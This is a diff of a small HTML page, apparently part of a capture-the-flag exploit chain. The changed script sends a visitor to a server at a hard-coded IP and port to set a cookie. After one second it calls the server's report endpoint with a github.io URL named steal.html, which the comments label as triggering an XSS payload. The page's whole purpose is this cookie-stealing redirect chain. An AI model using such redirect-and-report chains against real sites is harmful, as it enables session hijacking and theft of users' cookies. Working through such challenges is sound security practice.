@@ -1,13 +1,15 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta http-equiv="refresh" content="0; url=http://167.71.200.118:7002/">
-</head>
-<body>
   <script>
+    // Step 1: Visit homepage to set the cookie
+    window.location = "http://167.71.200.118:7002/";
+    
+    // Step 2: After 1 second, trigger the XSS payload
     setTimeout(() => {
-      window.location.href = "http://167.71.200.118:7002/report?url=https://francisgunadi.github.io/testing/steal.html";
-    }, 2000);
+      window.location = "http://167.71.200.118:7002/report?url=https://francisgunadi.github.io/testing/steal.html";
+    }, 1000);
   </script>
-</body>
+</head>
+<body></body>
 </html>
